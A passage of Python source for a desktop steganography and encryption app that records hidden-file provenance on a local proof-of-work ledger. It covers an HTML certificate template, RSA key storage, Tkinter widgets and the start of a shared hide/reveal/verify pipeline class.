    kind = {TX_REGISTER: "Concealment", TX_REVEAL: "Reveal receipt"}.get(tx["type"], "AI security record")
    rows = [("Certificate type", kind), ("File name", d.get("name", "(not recorded)")),
            ("Media", d.get("kind", "?")), ("Protection method", d.get("cipher", "?")),
            ("File SHA-256", d.get("file_sha256", "?")), ("Original cover SHA-256", d.get("cover_sha256", "—")),
            ("Signed by", signer_label(tx, my_id)), ("Signer ID (SHA-256 of public key)", tx["signer"]["id"]),
            ("Claimed time", fmt_time(tx["ts"]) + " (signer's clock)"), ("Transaction ID", tx["txid"]),
            ("Block", f"#{blk['index']}  ·  {blk['bits']}-bit proof-of-work"), ("Block hash", blk["hash"]),
            ("Merkle root", blk["merkle"]), ("Ledger height at export", cert.get("tip", {}).get("height", "?"))]
    body = "\n".join(f"<tr><th>{e(a)}</th><td>{e(b)}</td></tr>" for a, b in rows)
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CryptoSec proof certificate</title><style>
body{{margin:0;background:#0b0d12;color:#e6eaf2;font:15px/1.5 "Segoe UI",system-ui,sans-serif}}
.page{{max-width:820px;margin:40px auto;padding:36px 44px;background:#151922;border:1px solid #262c3b;border-radius:14px}}
h1{{margin:0;color:#22d3ee;font-size:26px;letter-spacing:.5px}} .sub{{color:#7c879b;margin:2px 0 22px}}
.seal{{display:inline-block;border:2px solid #22c55e;color:#22c55e;border-radius:8px;padding:4px 12px;font-weight:700;margin-bottom:18px}}
table{{width:100%;border-collapse:collapse}} th{{text-align:left;color:#7c879b;font-weight:600;width:34%;vertical-align:top;padding:7px 12px 7px 0}}
td{{font-family:Consolas,monospace;font-size:13px;word-break:break-all;padding:7px 0;border-bottom:1px solid #262c3b}}
.note{{margin-top:22px;color:#7c879b;font-size:12.5px}}
@media (prefers-color-scheme:light){{body{{background:#eef1f6;color:#141a26}}.page{{background:#fff;border-color:#d5dbe6}}td{{border-color:#e3e7ef}}h1{{color:#0e7490}}}}
@media print{{body{{background:#fff;color:#000}}.page{{border:0;background:#fff}}}}
</style></head><body><div class="page">
<h1>◈ CRYPTOSEC · PROOF CERTIFICATE</h1><div class="sub">Blockchain-backed provenance record · {e(cert.get('app', APP_TAG))}</div>
<div class="seal">⛓ SIGNED &amp; SEALED IN BLOCK #{e(blk['index'])}</div>
<table>{body}</table>
<p class="note">This certificate contains only fingerprints — never the hidden message, passphrase or keys.
Anyone can check it offline with CryptoSec (Verify → proof certificate): the signature, the Merkle proof and the
block's proof-of-work are all verified independently. Times come from the signer's own computer clock; publish a
ledger checkpoint to make them externally provable.</p></div></body></html>"""


# ═══════════════════════════════════════════════════════════════════════
#  RSA KEY MANAGER
# ═══════════════════════════════════════════════════════════════════════
class RSAKeyManager:
    PRIV_FILE, PUB_FILE = "rsa_private.pem", "rsa_public.pem"

    @classmethod
    def generate_and_save(cls):
        priv, pub = CryptoEngine.rsa_generate_keypair()
        with open(cls.PRIV_FILE, "w") as f:
            f.write(priv)
        try:
            os.chmod(cls.PRIV_FILE, 0o600)
        except OSError:
            pass
        with open(cls.PUB_FILE, "w") as f:
            f.write(pub)
        return priv, pub

    @classmethod
    def _load(cls, p):
        if not os.path.exists(p):
            return None
        with open(p) as f:
            return f.read()

    @classmethod
    def load_private(cls): return cls._load(cls.PRIV_FILE)
    @classmethod
    def load_public(cls): return cls._load(cls.PUB_FILE)


def fingerprint(pem: str | None) -> str:
    if not pem:
        return "—"
    h = hashlib.sha256(pem.encode()).hexdigest()
    return ":".join(h[i:i + 4] for i in range(0, 32, 4)).upper()


# ═══════════════════════════════════════════════════════════════════════
#  UI TOOLKIT
# ═══════════════════════════════════════════════════════════════════════
BG, SIDEBAR, CARD, CARD2 = "#0B0D12", "#0F1218", "#151922", "#1B2030"
BORDER, INPUT, TEXT = "#262C3B", "#0E1118", "#E6EAF2"
DISABLED = "#2A3040"

FONT = ("Segoe UI", 10)
FONT_B = ("Segoe UI", 10, "bold")
FONT_S = ("Segoe UI", 9)
FONT_SB = ("Segoe UI", 8, "bold")
FONT_H = ("Segoe UI", 16, "bold")
FONT_M = ("Consolas", 10)
FONT_MS = ("Consolas", 9)


def lighten(hexcol: str, amt: float = 0.15) -> str:
    r, g, b = (int(hexcol[i:i + 2], 16) for i in (1, 3, 5))
    r, g, b = (int(c + (255 - c) * amt) for c in (r, g, b))
    return f"#{r:02x}{g:02x}{b:02x}"


def make_entry(parent, **kw) -> tk.Entry:
    kw.setdefault("font", FONT)
    return tk.Entry(parent, bg=INPUT, fg=TEXT, insertbackground=ACCENT, relief="flat",
                    highlightthickness=1, highlightbackground=BORDER,
                    highlightcolor=ACCENT, disabledbackground=INPUT,
                    readonlybackground=INPUT, **kw)


def make_text(parent, **kw) -> tk.Text:
    return tk.Text(parent, bg=INPUT, fg=TEXT, insertbackground=ACCENT, relief="flat",
                   font=kw.pop("font", FONT_M), highlightthickness=1, highlightbackground=BORDER,
                   highlightcolor=ACCENT, padx=8, pady=6, wrap="word", undo=True, **kw)


def autowrap(lbl: tk.Label):
    lbl.bind("<Configure>", lambda e: lbl.configure(wraplength=max(120, e.width - 6)))


class FlatButton(tk.Label):
    def __init__(self, parent, text, command=None, bg=ACCENT, fg="#06121A",
                 font=FONT_B, padx=16, pady=8, **kw):
        super().__init__(parent, text=text, bg=bg, fg=fg, font=font, padx=padx, pady=pady,
                         cursor="hand2", **kw)
        self._base, self._fg, self._cmd, self._enabled = bg, fg, command, True
        self.bind("<Enter>", lambda e: self._enabled and self.configure(bg=lighten(self._base)))
        self.bind("<Leave>", lambda e: self._enabled and self.configure(bg=self._base))
        self.bind("<ButtonPress-1>", lambda e: self._enabled and self.configure(bg=lighten(self._base, .3)))
        self.bind("<ButtonRelease-1>", self._release)

    def _release(self, e):
        if not self._enabled:
            return
        self.configure(bg=lighten(self._base))
        if self._cmd and 0 <= e.x <= self.winfo_width() and 0 <= e.y <= self.winfo_height():
            self._cmd()

    def set_enabled(self, v: bool):
        self._enabled = v
        self.configure(bg=self._base if v else DISABLED, fg=self._fg if v else MUTED,
                       cursor="hand2" if v else "arrow")

    def set_color(self, bg, fg=None):
        self._base = bg
        if fg:
            self._fg = fg
        self.set_enabled(self._enabled)


class Card(tk.Frame):
    def __init__(self, parent, title="", pad=14):
        super().__init__(parent, bg=CARD, highlightthickness=1, highlightbackground=BORDER)
        if title:
            self.header = tk.Frame(self, bg=CARD)
            self.header.pack(fill="x", padx=pad, pady=(10, 0))
            tk.Label(self.header, text=title, font=FONT_SB, fg=ACCENT, bg=CARD).pack(side="left")
        self.body = tk.Frame(self, bg=CARD)
        self.body.pack(fill="both", expand=True, padx=pad, pady=(8, pad))


class Meter(tk.Canvas):
    def __init__(self, parent, height=8, bg=CARD):
        super().__init__(parent, height=height, bg=bg, highlightthickness=0)
        self._r, self._c = 0.0, MUTED
        self.bind("<Configure>", lambda e: self._draw())

    def set(self, ratio: float, color: str):
        self._r, self._c = max(0.0, min(1.0, ratio)), color
        self._draw()

    def _draw(self):
        self.delete("all")
        w, h = self.winfo_width(), self.winfo_height()
        self.create_rectangle(0, 0, w, h, fill=INPUT, outline="")
        if self._r > 0:
            self.create_rectangle(0, 0, int(w * self._r), h, fill=self._c, outline="")


class CipherTile(tk.Frame):
    def __init__(self, parent, info, on_select):
        super().__init__(parent, bg=CARD2, highlightthickness=2, highlightbackground=BORDER,
                         cursor="hand2")
        self.info, self.selected = info, False
        self._kids = [
            tk.Label(self, text=info["name"], font=FONT_B, fg=TEXT, bg=CARD2, anchor="w"),
            tk.Label(self, text="● " + info["tag"], font=FONT_SB, fg=info["color"], bg=CARD2, anchor="w"),
        ]
        for k in self._kids:
            k.pack(fill="x", padx=10, pady=(6, 0) if k is self._kids[0] else (0, 7))
        for w in (self, *self._kids):
            w.bind("<Button-1>", lambda e: on_select(info["id"]))
            w.bind("<Enter>", lambda e: self._hover(True))
            w.bind("<Leave>", lambda e: self._hover(False))

    def _hover(self, on):
        if not self.selected:
            self.configure(highlightbackground=lighten(BORDER, .35) if on else BORDER)

    def set_selected(self, sel: bool):
        self.selected = sel
        bg = lighten(CARD2, .06) if sel else CARD2
        self.configure(bg=bg, highlightbackground=self.info["color"] if sel else BORDER)
        for k in self._kids:
            k.configure(bg=bg)


class Checklist(tk.Frame):
    """Live 'what's left to do' list: ✔ done, ▶ next step, ○ later."""

    def __init__(self, parent, items, bg=CARD):
        super().__init__(parent, bg=bg)
        self.rows = []
        for t in items:
            r = tk.Frame(self, bg=bg)
            r.pack(fill="x", pady=2)
            ic = tk.Label(r, text="○", font=FONT_B, bg=bg, fg=MUTED, width=2)
            ic.pack(side="left")
            tx = tk.Label(r, text=t, font=FONT, bg=bg, fg=MUTED, anchor="w", justify="left")
            tx.pack(side="left", fill="x", expand=True)
            autowrap(tx)
            self.rows.append((ic, tx))

    def set(self, states):
        nxt = next((i for i, ok in enumerate(states) if not ok), None)
        for i, ((ic, tx), ok) in enumerate(zip(self.rows, states)):
            if ok:
                ic.configure(text="✔", fg=GREEN)
                tx.configure(fg=TEXT)
            elif i == nxt:
                ic.configure(text="▶", fg=ACCENT)
                tx.configure(fg=ACCENT)
            else:
                ic.configure(text="○", fg=MUTED)
                tx.configure(fg=MUTED)


class ScrollFrame(tk.Frame):
    """Vertically scrollable page so nothing is ever cut off on small screens."""

    def __init__(self, parent, bg=BG):
        super().__init__(parent, bg=bg)
        self.canvas = tk.Canvas(self, bg=bg, highlightthickness=0)
        self.vsb = tk.Scrollbar(self, orient="vertical", command=self.canvas.yview)
        self.canvas.configure(yscrollcommand=self._vs_set)
        self.canvas.pack(side="left", fill="both", expand=True)
        self.inner = tk.Frame(self.canvas, bg=bg)
        self.win = self.canvas.create_window((0, 0), window=self.inner, anchor="nw")
        self.inner.bind("<Configure>", lambda e: self._fit())
        self.canvas.bind("<Configure>", lambda e: self._fit())
        self.canvas.bind("<Enter>", self._bind_wheel)
        self.canvas.bind("<Leave>", self._unbind_wheel)

    def _fit(self):
        cw, ch, ih = self.canvas.winfo_width(), self.canvas.winfo_height(), self.inner.winfo_reqheight()
        h = max(ih, ch)
        self.canvas.itemconfigure(self.win, width=cw, height=h)
        self.canvas.configure(scrollregion=(0, 0, cw, h))

    def _vs_set(self, lo, hi):
        self.vsb.set(lo, hi)
        if float(lo) <= 0.0 and float(hi) >= 1.0:
            self.vsb.pack_forget()
        elif not self.vsb.winfo_ismapped():
            self.vsb.pack(side="right", fill="y", before=self.canvas)

    def _bind_wheel(self, _e):
        self.canvas.bind_all("<MouseWheel>", self._wheel)
        self.canvas.bind_all("<Button-4>", lambda e: self._scroll(-1))
        self.canvas.bind_all("<Button-5>", lambda e: self._scroll(1))

    def _unbind_wheel(self, _e):
        for ev in ("<MouseWheel>", "<Button-4>", "<Button-5>"):
            self.canvas.unbind_all(ev)

    def _wheel(self, e):
        self._scroll(-1 if e.delta > 0 else 1)

    def _scroll(self, d):
        if self.inner.winfo_reqheight() > self.canvas.winfo_height():
            self.canvas.yview_scroll(d * 2, "units")


class KeyInput(tk.Frame):
    """Context-sensitive key entry: passphrase / Caesar shift / RSA key status."""

    def __init__(self, parent, app, bg=CARD, confirm=False):
        super().__init__(parent, bg=bg)
        self.app, self.bg, self.mode, self.confirm = app, bg, None, confirm
        self.on_change = None
        self.pw_var, self.pw2_var = tk.StringVar(), tk.StringVar()
        self.shift_var = tk.IntVar(value=3)

        # passphrase
        self.pass_row = tk.Frame(self, bg=bg)
        tk.Label(self.pass_row, text="PASSPHRASE  (a secret word or sentence you will remember)",
                 font=FONT_SB, fg=MUTED, bg=bg).pack(anchor="w")
        r = tk.Frame(self.pass_row, bg=bg)
        r.pack(fill="x", pady=(3, 0))
        self.pw_entry = make_entry(r, textvariable=self.pw_var, show="•")
        self.pw_entry.pack(side="left", fill="x", expand=True, ipady=6)
        self.eye = FlatButton(r, "SHOW", self._toggle, bg=CARD2, fg=TEXT, font=FONT_SB, padx=10, pady=7)
        self.eye.pack(side="left", padx=(6, 0))
        if confirm:
            tk.Label(self.pass_row, text="CONFIRM PASSPHRASE  (type it again to avoid typos)",
                     font=FONT_SB, fg=MUTED, bg=bg).pack(anchor="w", pady=(8, 0))
            self.pw2_entry = make_entry(self.pass_row, textvariable=self.pw2_var, show="•")
            self.pw2_entry.pack(fill="x", pady=(3, 0), ipady=6)
            info = tk.Frame(self.pass_row, bg=bg)
            info.pack(fill="x", pady=(6, 0))
            self.meter = Meter(info, bg=bg)
            self.meter.pack(side="left", fill="x", expand=True)
            self.meter_lbl = tk.Label(info, text="", font=FONT_SB, bg=bg, fg=MUTED, width=8, anchor="e")
            self.meter_lbl.pack(side="left")
            self.match_lbl = tk.Label(self.pass_row, text="", font=FONT_SB, bg=bg, anchor="w")
            self.match_lbl.pack(fill="x")
        # caesar
        self.cs_row = tk.Frame(self, bg=bg)
        tk.Label(self.cs_row, text="SHIFT (0–25)", font=FONT_SB, fg=MUTED, bg=bg).pack(anchor="w")
        tk.Scale(self.cs_row, from_=0, to=25, orient="horizontal", variable=self.shift_var,
                 bg=bg, fg=TEXT, troughcolor=INPUT, highlightthickness=0, bd=0,
                 activebackground=ACCENT, font=FONT_S, showvalue=True).pack(fill="x")
        self.cs_prev = tk.Label(self.cs_row, text="", font=FONT_MS, fg=ACCENT, bg=bg, anchor="w")
        self.cs_prev.pack(fill="x")
        # rsa
        self.rsa_row = tk.Frame(self, bg=bg)
        self.rsa_lbl = tk.Label(self.rsa_row, text="", font=FONT, bg=bg, anchor="w", justify="left")
        self.rsa_lbl.pack(side="left")
        FlatButton(self.rsa_row, "Manage keys →", lambda: app.show_page("keys"),
                   bg=CARD2, fg=TEXT, font=FONT_SB, padx=10, pady=6).pack(side="right")
        # idle
        self.idle = tk.Label(self, text="Choose a file first — the key you need will appear here.",
                             font=FONT_S, fg=MUTED, bg=bg, anchor="w")
        for v in (self.pw_var, self.pw2_var, self.shift_var):
            v.trace_add("write", lambda *_: self._changed())
        self._changed()
        self.set_mode(None)

    def _changed(self):
        self.cs_prev.configure(text=f"Hello, World  →  {CryptoEngine.caesar_encrypt('Hello, World', self.shift_var.get())}")
        if self.confirm:
            r, txt, col = password_strength(self.pw_var.get())
            self.meter.set(r, col)
            self.meter_lbl.configure(text=txt, fg=col)
            a, b = self.pw_var.get(), self.pw2_var.get()
            if not b:
                self.match_lbl.configure(text="")
            elif a == b:
                self.match_lbl.configure(text="✔ Both match", fg=GREEN)
            else:
                self.match_lbl.configure(text="✖ They do not match yet", fg=RED)
        if self.on_change:
            self.on_change()

    def _toggle(self):
        shown = self.pw_entry.cget("show") == ""
        ch = "•" if shown else ""
        self.pw_entry.configure(show=ch)
        if self.confirm:
            self.pw2_entry.configure(show=ch)
        self.eye.configure(text="SHOW" if shown else "HIDE")

    def refresh_rsa(self):
        need_pub = self.mode == "rsa_enc"
        key = self.app.rsa_pub if need_pub else self.app.rsa_priv
        what = "public" if need_pub else "private"
        if key:
            self.rsa_lbl.configure(text=f"✔ RSA {what} key loaded   {fingerprint(key)[:19]}…", fg=GREEN)
        else:
            self.rsa_lbl.configure(text=f"✖ No RSA {what} key yet — open “Keys” to create one", fg=RED)
        if self.on_change:
            self.on_change()

    def set_mode(self, mode):
        for f in (self.pass_row, self.cs_row, self.rsa_row, self.idle):
            f.pack_forget()
        self.mode = mode
        if mode == "pass":
            self.pass_row.pack(fill="x")
        elif mode == "caesar":
            self.cs_row.pack(fill="x")
        elif mode in ("rsa_enc", "rsa_dec"):
            self.rsa_row.pack(fill="x")
            self.refresh_rsa()
        else:
            self.idle.pack(fill="x")
        if self.on_change:
            self.on_change()

    def is_ready(self) -> bool:
        m = self.mode
        if m == "pass":
            pw = self.pw_var.get()
            return bool(pw) and (not self.confirm or pw == self.pw2_var.get())
        if m == "caesar":
            return True
        if m == "rsa_enc":
            return bool(self.app.rsa_pub)
        if m == "rsa_dec":
            return bool(self.app.rsa_priv)
        return False

    def get_secret(self):
        m = self.mode
        if m == "pass":
            if not self.pw_var.get():
                self.app.problem("Please type a passphrase first.\n\nIt is the secret you will need again "
                                 "when you want to read the message.")
                self.pw_entry.focus_set()
                return None
            if self.confirm and self.pw_var.get() != self.pw2_var.get():
                self.app.problem("The two passphrases are not the same.\n\nPlease type them again — a typo "
                                 "now would make the message impossible to read later.")
                self.pw2_entry.focus_set()
                return None
            return self.pw_var.get()
        if m == "caesar":
            return int(self.shift_var.get())
        if m in ("rsa_enc", "rsa_dec"):
            key = self.app.rsa_pub if m == "rsa_enc" else self.app.rsa_priv
            if not key:
                self.app.problem("No RSA key is loaded yet.\n\nOpen the “Keys” page and click "
                                 "“Generate new pair” (or load an existing key).")
                self.app.show_page("keys")
                return None
            return key
        self.app.problem("Please choose a file first.")
        return None


class MediaPreview(tk.Frame):
    """Image viewer / smooth video player driven by Tk's event loop."""

    def __init__(self, parent, bg=CARD):
        super().__init__(parent, bg=bg)
        self.holder = tk.Frame(self, bg="#07090D", height=210)
        self.holder.pack(fill="both", expand=True)
        self.holder.pack_propagate(False)
        self.view = tk.Label(self.holder, bg="#07090D", fg=MUTED, font=FONT_S,
                             text="No media loaded\n\nSelect or drop a file")
        self.view.place(relx=.5, rely=.5, anchor="center")
        self.ctrl = tk.Frame(self, bg=bg)
        self.play_btn = FlatButton(self.ctrl, "▶", self.toggle, bg=ACCENT2, fg=TEXT, padx=12, pady=4)
        self.play_btn.pack(side="left")
        self.pos_var = tk.DoubleVar(value=0)
        self.scale = tk.Scale(self.ctrl, from_=0, to=1, orient="horizontal", showvalue=False,
                              variable=self.pos_var, bg=bg, troughcolor=INPUT, highlightthickness=0,
                              bd=0, activebackground=ACCENT, command=self._seek)
        self.scale.pack(side="left", fill="x", expand=True, padx=8)
        self.time_lbl = tk.Label(self.ctrl, text="0:00", font=FONT_MS, fg=MUTED, bg=bg, width=11)
        self.time_lbl.pack(side="left")
        self.cap, self.playing, self._job, self._setting = None, False, None, False
        self.fps, self.nframes = 25.0, 0
        self._tkimg = None

    def _fit(self, rgb: np.ndarray):
        bw, bh = max(self.holder.winfo_width(), 200), max(self.holder.winfo_height(), 150)
        h, w = rgb.shape[:2]
        s = min(bw / w, bh / h)
        if s != 1:
            rgb = cv2.resize(rgb, (max(1, int(w * s)), max(1, int(h * s))),
                             interpolation=cv2.INTER_AREA if s < 1 else cv2.INTER_LINEAR)
        self._tkimg = ImageTk.PhotoImage(Image.fromarray(rgb))
        self.view.configure(image=self._tkimg, text="")

    def stop(self):
        self.playing = False
        if self._job:
            self.after_cancel(self._job)
            self._job = None
        self.play_btn.configure(text="▶")

    def clear(self):
        self.stop()
        if self.cap:
            self.cap.release()
            self.cap = None
        self.ctrl.pack_forget()
        self._tkimg = None
        self.view.configure(image="", text="No media loaded\n\nSelect or drop a file")

    def load(self, path: str):
        self.clear()
        kind = media_kind(path)
        try:
            if kind == "image":
                self._fit(np.array(Image.open(path).convert("RGB")))
            elif kind == "video":
                self.cap = cv2.VideoCapture(path)
                if not self.cap.isOpened():
                    raise ValueError("Cannot open video")
                self.fps = self.cap.get(cv2.CAP_PROP_FPS) or 25.0
                self.nframes = max(1, int(self.cap.get(cv2.CAP_PROP_FRAME_COUNT)))
                self.scale.configure(to=self.nframes - 1)
                self.ctrl.pack(fill="x", pady=(6, 0))
                self._show_next()
        except Exception as e:
            self.view.configure(image="", text=f"Preview unavailable\n{e}")

    def _show_next(self) -> bool:
        ret, frame = self.cap.read()
        if not ret:
            return False
        self._fit(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        pos = int(self.cap.get(cv2.CAP_PROP_POS_FRAMES))
        self._setting = True
        self.pos_var.set(pos)
        self._setting = False
        t, T = pos / self.fps, self.nframes / self.fps
        self.time_lbl.configure(text=f"{int(t // 60)}:{int(t % 60):02d} / {int(T // 60)}:{int(T % 60):02d}")
        return True

    def toggle(self):
        if not self.cap:
            return
        self.playing = not self.playing
        self.play_btn.configure(text="❚❚" if self.playing else "▶")
        if self.playing:
            self._tick()

    def _tick(self):
        if not self.playing or not self.cap:
            return
        t0 = time.perf_counter()
        if not self._show_next():
            self.cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            self.stop()
            self._show_next()
            self.cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            return
        delay = max(1, int(1000 / self.fps - (time.perf_counter() - t0) * 1000))
        self._job = self.after(delay, self._tick)

    def _seek(self, v):
        if self._setting or not self.cap:
            return
        self.cap.set(cv2.CAP_PROP_POS_FRAMES, int(float(v)))
        if not self.playing:
            self._show_next()


class StatTile(tk.Frame):
    """Big-number tile for the ledger dashboard."""

    def __init__(self, parent, caption: str):
        super().__init__(parent, bg=CARD2, highlightthickness=1, highlightbackground=BORDER)
        self.val = tk.Label(self, text="—", font=("Segoe UI", 19, "bold"), fg=TEXT, bg=CARD2, anchor="w")
        self.val.pack(fill="x", padx=14, pady=(10, 0))
        tk.Label(self, text=caption, font=FONT_SB, fg=MUTED, bg=CARD2, anchor="w").pack(fill="x", padx=14)
        self.sub = tk.Label(self, text="", font=FONT_S, fg=MUTED, bg=CARD2, anchor="w", justify="left")
        self.sub.pack(fill="x", padx=14, pady=(0, 10))
        autowrap(self.sub)

    def set(self, value: str, color: str = TEXT, sub: str = ""):
        self.val.configure(text=value, fg=color)
        self.sub.configure(text=sub)


class Segmented(tk.Frame):
    """Pill-style single choice selector: [Light] [Standard] [Strong]."""

    def __init__(self, parent, options, value, on_change=None, bg=CARD):
        super().__init__(parent, bg=bg)
        self.btns, self.value, self.on_change = {}, None, on_change
        for label, val, sub in options:
            col = tk.Frame(self, bg=bg)
            col.pack(side="left", padx=(0, 8))
            b = FlatButton(col, label, lambda v=val: self.set(v, True), bg=CARD2, fg=TEXT,
                           font=FONT_SB, padx=16, pady=6)
            b.pack()
            tk.Label(col, text=sub, font=FONT_S, fg=MUTED, bg=bg).pack()
            self.btns[val] = b
        self.set(value)

    def set(self, value, notify: bool = False):
        self.value = value
        for k, b in self.btns.items():
            b.set_color(ACCENT if k == value else CARD2, "#06121A" if k == value else TEXT)
        if notify and self.on_change:
            self.on_change(value)


class ChainStrip(tk.Frame):
    """Visual chain: block cards joined by arrows.  Green = verified, red = broken,
    gold border = the block that was just added, cyan border = selected."""
    CW, CH, GAP, PAD, MAX_DRAW = 148, 84, 38, 12, 300

    def __init__(self, parent, on_select=None, bg=CARD, scroll: bool = True):
        super().__init__(parent, bg=bg)
        self.cv = tk.Canvas(self, height=self.CH + 2 * self.PAD, bg=bg, highlightthickness=0)
        self.cv.pack(fill="x")
        if scroll:
            self.sb = tk.Scrollbar(self, orient="horizontal", command=self.cv.xview)
            self.sb.pack(fill="x")
            self.cv.configure(xscrollcommand=self.sb.set)
        self.on_select, self._first, self._x0, self._n = on_select, 0, self.PAD, 0
        self.cv.bind("<Button-1>", self._click)

    def set_blocks(self, blocks, bad=(), flash=None, selected=None, follow: bool = True):
        cv, CW, CH, GAP, PAD = self.cv, self.CW, self.CH, self.GAP, self.PAD
        cv.delete("all")
        start = max(0, len(blocks) - self.MAX_DRAW)
        shown = blocks[start:]
        x = PAD
        if start:
            cv.create_text(x, PAD + CH // 2, text=f"… {start}\nearlier", anchor="w", font=FONT_S, fill=MUTED)
            x += 64
        self._first, self._x0, self._n = start, x, len(shown)
        for k, b in enumerate(shown):
            i, y0 = b["index"], PAD
            broken, genesis = i in bad, i == 0
            top = RED if broken else (MUTED if genesis else GREEN)
            hot = i == selected or i == flash
            cv.create_rectangle(x, y0, x + CW, y0 + CH, fill=CARD2, width=2 if hot else 1,
                                outline=ACCENT if i == selected else GOLD if i == flash else BORDER)
            cv.create_rectangle(x, y0, x + CW, y0 + 5, fill=top, outline="")
            cv.create_text(x + 10, y0 + 22, anchor="w", font=FONT_B, fill=TEXT,
                           text="GENESIS" if genesis else f"BLOCK #{i}")
            cv.create_text(x + 10, y0 + 43, anchor="w", font=FONT_MS, fill=ACCENT, text=short_hash(b["hash"], 12))
            sub = "root of trust" if genesis else f"{len(b['txs'])} tx  ·  {fmt_time(b['ts'])[11:16]}"
            cv.create_text(x + 10, y0 + 63, anchor="w", font=FONT_S, fill=MUTED, text=sub)
            if broken:
                cv.create_text(x + CW - 8, y0 + 22, anchor="e", font=FONT_SB, fill=RED, text="✖ BROKEN")
            elif i == flash:
                cv.create_text(x + CW - 8, y0 + 22, anchor="e", font=FONT_SB, fill=GOLD, text="● NEW")
            if k < len(shown) - 1:
                cv.create_line(x + CW + 3, y0 + CH // 2, x + CW + GAP - 3, y0 + CH // 2,
                               fill=RED if shown[k + 1]["index"] in bad else MUTED, width=2, arrow="last")
            x += CW + GAP
        cv.configure(scrollregion=(0, 0, x, self.CH + 2 * PAD))
        if follow:
            cv.xview_moveto(1.0)

    def _click(self, e):
        if not self.on_select or not self._n:
            return
        x = self.cv.canvasx(e.x) - self._x0
        k = int(x // (self.CW + self.GAP))
        if 0 <= k < self._n and x - k * (self.CW + self.GAP) <= self.CW:
            self.on_select(self._first + k)


class ResultList(tk.Text):
    """Read-only checklist-style report: ✔ ok · ✖ fail · ⚠ warn · ℹ info · heading."""
    ICON = {"ok": ("✔", GREEN), "fail": ("✖", RED), "warn": ("⚠", GOLD), "info": ("ℹ", MUTED)}

    def __init__(self, parent, height: int = 9):
        super().__init__(parent, bg=INPUT, fg=TEXT, font=FONT, relief="flat", wrap="word", padx=10, pady=8,
                         height=height, state="disabled", cursor="arrow", highlightthickness=1,
                         highlightbackground=BORDER)
        for k, (_, col) in self.ICON.items():
            self.tag_configure("i_" + k, foreground=col, font=FONT_B)
        self.tag_configure("t_fail", foreground="#FCA5A5")
        self.tag_configure("t_info", foreground=MUTED)
        self.tag_configure("head", foreground=ACCENT, font=FONT_SB, spacing1=6, spacing3=2)
        self.tag_configure("body", lmargin1=0, lmargin2=22, spacing3=4)
        self.tag_configure("idle", foreground=MUTED)

    def show(self, lines, idle: str = ""):
        self.configure(state="normal")
        self.delete("1.0", "end")
        if not lines:
            self.insert("end", idle, "idle")
        for status, text in lines:
            if status == "head":
                self.insert("end", text + "\n", "head")
                continue
            icon, _ = self.ICON.get(status, ("•", MUTED))
            self.insert("end", icon + "  ", ("i_" + status, "body"))
            self.insert("end", text + "\n", ("t_" + status, "body"))
        self.configure(state="disabled")


def describe_block(b: dict, problems: list) -> str:
    rows = [("BLOCK", f"#{b['index']}" + ("  (genesis)" if b["index"] == 0 else "")),
            ("Hash", b["hash"]), ("Previous", b["prev"]), ("Merkle root", b["merkle"]),
            ("Mined", f"{fmt_time(b['ts'])}  ·  nonce {b['nonce']:,}  ·  {b['bits']}-bit proof-of-work"),
            ("Transactions", str(len(b["txs"]))),
            ("Integrity", "✔ verified" if not problems else "✖ " + "; ".join(problems))]
    w = max(len(a) for a, _ in rows) + 2
    return "\n".join(f"{a:<{w}}{v}" for a, v in rows)


def make_check(parent, text, var, bg=CARD, **kw):
    return tk.Checkbutton(parent, text=text, variable=var, bg=bg, fg=TEXT, selectcolor=INPUT,
                          activebackground=bg, activeforeground=TEXT, font=kw.pop("font", FONT),
                          highlightthickness=0, bd=0, anchor="w", justify="left", cursor="hand2", **kw)


def enable_drop(widget, callback):
    if not _DND:
        return
    try:
        widget.drop_target_register(DND_FILES)
        widget.dnd_bind("<<Drop>>", lambda e: callback(e.widget.tk.splitlist(e.data)[0]))
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════
#  APPLICATION
# ═══════════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════════
#  v6  ·  AI ⇄ CRYPTO ⇄ STEGANOGRAPHY ⇄ BLOCKCHAIN  — ONE SHARED PIPELINE
# ═══════════════════════════════════════════════════════════════════════
class AIPolicyBlock(Exception):
    """Raised when the AI security layer refuses to continue (e.g. a malicious cover file)."""


class SecureFlow:
    """The single code path behind HIDE, REVEAL and VERIFY.

    The desktop app and the REST API both call this class, so everything is literally the same system:

      HIDE   message ─► DLP/phishing scan ─► cover-file malware + steganalysis ─► encrypt ─► embed in image/video
             ─► read-back check ─► steganalysis of the result ─► blockchain REGISTER (signed, carries the AI summary)
      REVEAL file ─► malware/polyglot scan ─► lock check ─► decrypt (failures feed password-attack + behaviour analytics)
             ─► DLP/phishing scan of the message ─► blockchain REVEAL receipt
      VERIFY file ─► ledger lookup ─► AI scan (+ optional signed AI_SCAN record)

    AI findings of high severity, incident cases and trained models are sealed on the same chain (AI_ALERT / AI_CASE / AI_MODEL).
    Never stored on-chain: messages, passphrases, keys, ciphertext."""

    def __init__(self, identity, ledger, settings, hub):
        self.identity, self.ledger, self.settings, self.hub = identity, ledger, settings, hub
        if hub is not None:
            hub.seal_fn = self.seal_batch
        self._mine_lock = threading.Lock()
        self._mirrored_h = -2

    # -- ledger ---------------------------------------------------------
    def seal(self, specs, bits=None, progress=None):
        txs = [make_tx(self.identity, t, d) for t, d in specs]
        blks = self.ledger.add_transactions(txs, bits or int(self.settings["bits"]), progress)
        self.mirror()
        return txs, blks

    # -- PostgreSQL mirror of the chain (the JSONL ledger stays the authority) --
    def _pg(self):
        pg = getattr(self.hub, "pg", None) if self.hub else None
        return pg if pg is not None and pg.connected else None

    def mirror(self, full=False) -> int:
        pg = self._pg()
        if pg is None:
            return 0
        try:
            self._mirrored_h = self.ledger.height
            return pg.mirror_ledger(self.ledger.snapshot(), full)
        except Exception:
            self._mirrored_h = -1
            return 0

    def mirror_verify(self) -> dict:
        pg = self._pg()
        if pg is None:
            raise NotImplementedError("PostgreSQL is not enabled")
        return pg.ledger_verify(self.ledger.snapshot())

    def audit_verify(self) -> dict:
        """Recompute the audit hash chain, then check every AI_AUDIT anchor on the blockchain against the database."""
        pg = self._pg()
        if pg is None:
            raise NotImplementedError("PostgreSQL is not enabled")
        chain = pg.audit_verify()
